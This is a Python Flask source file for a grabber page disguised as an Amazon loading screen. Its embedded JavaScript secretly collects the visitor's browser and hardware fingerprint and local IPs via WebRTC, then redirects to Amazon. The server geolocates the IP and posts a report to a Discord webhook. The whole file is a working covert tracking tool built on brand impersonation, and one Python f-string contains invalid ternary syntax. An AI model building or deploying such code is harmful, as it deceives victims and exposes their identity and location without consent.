from flask import Flask, request, render_template_string, jsonify, abort
import requests
import os
import textwrap

app = Flask(__name__)
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK")
SECRET_HEADER = os.environ.get("SECRET_KEY", "your-secret-key-here")

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading Amazon...</title>
  <style>
    body { 
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: #ffffff;
      font-family: Arial, sans-serif;
    }
    
    .loader-container {
      text-align: center;
    }

    .amazon-loader {
      width: 60px;
      height: 60px;
      border: 4px solid #FF9900;
      border-radius: 50%;
      border-top-color: transparent;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
      position: relative;
    }

    .amazon-loader::after {
      content: '';
      position: absolute;
      top: -4px;
      left: -4px;
      right: -4px;
      bottom: -4px;
      border: 4px solid #ff990033;
      border-radius: 50%;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-text {
      color: #232F3E;
      font-size: 18px;
      font-weight: bold;
      margin-top: 20px;
    }

    .amazon-brand {
      color: #232F3E;
      font-size: 24px;
      margin-top: 10px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="loader-container">
    <div class="amazon-loader"></div>
    <div class="loading-text">Securing Connection...</div>
    <div class="amazon-brand">Amazon</div>
  </div>

  <script>
    async function collectInfo() {
      const fingerprint = {
        screen: { 
          width: screen.width,
          height: screen.height,
          colorDepth: screen.colorDepth,
          pixelRatio: window.devicePixelRatio,
          orientation: window.screen.orientation.type
        },
        webgl: getWebGLInfo(),
        audio: await getAudioFingerprint(),
        fonts: await getFontsList(),
        hardware: {
          concurrency: navigator.hardwareConcurrency,
          memory: navigator.deviceMemory,
          touch: 'ontouchstart' in window,
          vibration: 'vibrate' in navigator
        },
        network: {
          ips: await getIPs(),
          connection: navigator.connection ? {
            downlink: navigator.connection.downlink,
            effectiveType: navigator.connection.effectiveType,
            rtt: navigator.connection.rtt
          } : null
        },
        platform: {
          os: navigator.platform,
          userAgent: navigator.userAgent,
          vendor: navigator.vendor,
          language: navigator.language,
          languages: navigator.languages,
          cookieEnabled: navigator.cookieEnabled,
          doNotTrack: navigator.doNotTrack,
          pdfViewerEnabled: navigator.pdfViewerEnabled
        },
        time: {
          zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          offset: new Date().getTimezoneOffset()
        },
        extra: {
          plugins: Array.from(navigator.plugins).map(p => p.name),
          mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
          serviceWorker: 'serviceWorker' in navigator,
          storage: {
            localStorage: 'localStorage' in window,
            sessionStorage: 'sessionStorage' in window,
            indexedDB: 'indexedDB' in window
          }
        }
      };

      try {
        const battery = await navigator.getBattery();
        fingerprint.battery = {
          level: battery.level,
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      } catch {}

      try {
        fingerprint.canvas = getCanvasFingerprint();
      } catch {}

      await fetch("/collect", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Secret-Key": "{{SECRET_HEADER}}"
        },
        body: JSON.stringify(fingerprint)
      });

      setTimeout(() => {
        window.location.href = "https://www.amazon.in";
      }, 3000);
    }

    function getWebGLInfo() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
          vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
          renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
          parameters: Array.from({ length: 374 }, (_, i) => 
            gl.getParameter(i)?.toString().substring(0, 100)
          )
        };
      } catch {
        return null;
      }
    }

    function getCanvasFingerprint() {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = '#069';
      ctx.fillText('CanvasFingerprint', 2, 15);
      return canvas.toDataURL();
    }

    async function getAudioFingerprint() {
      try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        
        oscillator.connect(analyser);
        analyser.connect(audioContext.destination);
        oscillator.start(0);
        
        const fftSize = 2048;
        analyser.fftSize = fftSize;
        const buffer = new Uint8Array(analyser.frequencyBinCount);
        analyser.getByteFrequencyData(buffer);
        
        oscillator.stop();
        audioContext.close();
        
        return Array.from(buffer);
      } catch {
        return null;
      }
    }

    async function getFontsList() {
      const fontCheck = new Set([
        'monospace', 'sans-serif', 'serif', 'Arial', 'Arial Black', 'Helvetica',
        'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS'
      ]);
      
      const available = [];
      for (const font of fontCheck.values()) {
        try {
          await document.fonts.load(`12px "${font}"`);
          available.push(font);
        } catch {}
      }
      return available;
    }

    async function getIPs() {
      return new Promise(resolve => {
        const ips = [];
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
        pc.onicecandidate = e => {
          if (!e.candidate) {
            pc.close();
            resolve(ips);
            return;
          }
          const ip = e.candidate.candidate.split(' ')[4];
          if (ip && !ips.includes(ip)) ips.push(ip);
        };
        
        setTimeout(() => resolve(ips), 1000);
      });
    }

    collectInfo();
  </script>
</body>
</html>
"""

def split_discord_message(content, max_length=1900):
    return textwrap.wrap(content, width=max_length, replace_whitespace=False)

def require_secret(func):
    def wrapper(*args, **kwargs):
        if request.headers.get("X-Secret-Key") != SECRET_HEADER:
            abort(403)
        return func(*args, **kwargs)
    wrapper.__name__ = func.__name__
    return wrapper

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE.replace("{{SECRET_HEADER}}", SECRET_HEADER))

@app.route("/collect", methods=["POST"])
@require_secret
def collect():
    data = request.json
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    
    try:
        ip_info = requests.get(f"https://ipinfo.io/{ip}/json").json()
    except Exception as e:
        ip_info = {"error": str(e)}

    report = f"""
    🔍 **Advanced Fingerprint Report** - `{ip}`
    
    **🌐 Network**
    - IPs: {', '.join(data.get('network', {}).get('ips', []))}
    - Type: {data.get('network', {}).get('connection', {}).get('effectiveType', 'N/A')}
    - Speed: {data.get('network', {}).get('connection', {}).get('downlink', 'N/A')}Mbps
    
    **🖥 System**
    - OS: {data.get('platform', {}).get('os', 'N/A')}
    - RAM: {data.get('hardware', {}).get('memory', 'N/A')}GB
    - Cores: {data.get('hardware', {}).get('concurrency', 'N/A')}
    - Touch: {data.get('hardware', {}).get('touch', False) ? 'Yes' : 'No'}
    
    **📷 WebGL**
    - Vendor: {data.get('webgl', {}).get('vendor', 'N/A')}
    - Renderer: {data.get('webgl', {}).get('renderer', 'N/A')}
    
    **🔊 Audio FP**
    - Hash: {hash(str(data.get('audio', [])))}
    
    **📚 Fonts**
    - Detected: {', '.join(data.get('fonts', []))}
    
    **🌍 Location**
    - Timezone: {data.get('time', {}).get('zone', 'N/A')}
    - Offset: {data.get('time', {}).get('offset', 'N/A')}min
    
    **🔧 Browser**
    - User Agent: {data.get('platform', {}).get('userAgent', 'N/A')}
    - Plugins: {', '.join(data.get('extra', {}).get('plugins', []))}
    - DNT: {data.get('platform', {}).get('doNotTrack', 'N/A')}
    
    **📡 IP Info**
    - ISP: {ip_info.get('org', 'N/A')}
    - Location: {ip_info.get('city', 'N/A')}, {ip_info.get('region', 'N/A')}
    - Country: {ip_info.get('country', 'N/A')}
    - Coords: {ip_info.get('loc', 'N/A')}
    """.strip()

    try:
        for chunk in split_discord_message(report):
            requests.post(DISCORD_WEBHOOK, json={"content": chunk})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

    return jsonify({"status": "success"})


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
